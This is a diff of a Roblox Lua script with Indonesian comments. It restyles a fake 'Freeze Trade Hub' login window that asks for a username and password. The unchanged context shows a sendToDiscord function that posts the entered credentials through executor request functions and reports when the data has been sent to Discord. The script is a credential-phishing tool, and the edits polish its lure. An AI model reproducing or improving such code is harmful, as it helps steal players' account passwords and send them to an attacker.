@@ -15,7 +15,6 @@ local function sendToDiscord(username, password)
     }
 
     if syn and syn.request then
-        -- Menggunakan syn.request untuk executor seperti Synapse X
         local response = syn.request(payload)
         if response and response.StatusCode == 200 then
             print("Data berhasil dikirim ke Discord!")
@@ -23,7 +22,6 @@ local function sendToDiscord(username, password)
             print("Gagal mengirim data ke Discord:", response and response.StatusCode or "Unknown Error")
         end
     elseif http and http.request then
-        -- Menggunakan http.request untuk executor yang mendukung
         local response = http.request(payload)
         if response and response.StatusCode == 200 then
             print("Data berhasil dikirim ke Discord!")
@@ -31,7 +29,6 @@ local function sendToDiscord(username, password)
             print("Gagal mengirim data ke Discord:", response and response.StatusCode or "Unknown Error")
         end
     elseif request then
-        -- Menggunakan request untuk executor alternatif
         local response = request(payload)
         if response and response.StatusCode == 200 then
             print("Data berhasil dikirim ke Discord!")
@@ -58,9 +55,9 @@ screenGui.Parent = game:GetService("CoreGui")
 -- Properti Frame
 frame.Name = "LoginFrame"
 frame.Parent = screenGui
-frame.Size = UDim2.new(0, 300, 0, 200)
-frame.Position = UDim2.new(0.5, -150, 0.5, -100)
-frame.BackgroundColor3 = Color3.new(0.2, 0.2, 0.2)
+frame.Size = UDim2.new(0, 300, 0, 250)
+frame.Position = UDim2.new(0.5, -150, 0.5, -125)
+frame.BackgroundColor3 = Color3.new(0.1, 0.1, 0.1)
 frame.BorderSizePixel = 3
 frame.BorderColor3 = Color3.new(1, 0, 0)
 
@@ -72,9 +69,10 @@ titleLabel.Position = UDim2.new(0, 5, 0, 5)
 titleLabel.BackgroundTransparency = 1
 titleLabel.Font = Enum.Font.SourceSansBold
 titleLabel.Text = "Freeze Trade Hub"
-titleLabel.TextSize = 20
-titleLabel.TextColor3 = Color3.new(1, 1, 1)
-titleLabel.TextStrokeTransparency = 0.8
+titleLabel.TextSize = 24 -- Ukuran font lebih besar
+titleLabel.TextColor3 = Color3.new(1, 1, 1) -- Warna teks putih
+titleLabel.TextStrokeTransparency = 0 -- Tambahkan garis tepi agar lebih jelas
+titleLabel.TextStrokeColor3 = Color3.new(0, 0, 0) -- Warna tepi hitam
 
 -- Properti UsernameBox
 usernameBox.Name = "UsernameBox"
@@ -85,7 +83,7 @@ usernameBox.PlaceholderText = "Enter Username"
 usernameBox.Font = Enum.Font.SourceSans
 usernameBox.Text = ""
 usernameBox.TextSize = 16
-usernameBox.BackgroundColor3 = Color3.new(0.1, 0.1, 0.1)
+usernameBox.BackgroundColor3 = Color3.new(0.2, 0.2, 0.2)
 usernameBox.TextColor3 = Color3.new(1, 1, 1)
 
 -- Properti PasswordBox
@@ -97,14 +95,14 @@ passwordBox.PlaceholderText = "Enter Password"
 passwordBox.Font = Enum.Font.SourceSans
 passwordBox.Text = ""
 passwordBox.TextSize = 16
-passwordBox.BackgroundColor3 = Color3.new(0.1, 0.1, 0.1)
+passwordBox.BackgroundColor3 = Color3.new(0.2, 0.2, 0.2)
 passwordBox.TextColor3 = Color3.new(1, 1, 1)
 
 -- Properti LoginButton
 loginButton.Name = "LoginButton"
 loginButton.Parent = frame
 loginButton.Size = UDim2.new(1, -20, 0, 40)
-loginButton.Position = UDim2.new(0, 10, 0, 150)
+loginButton.Position = UDim2.new(0, 10, 0, 160)
 loginButton.Text = "Login"
 loginButton.Font = Enum.Font.SourceSansBold
 loginButton.TextSize = 18
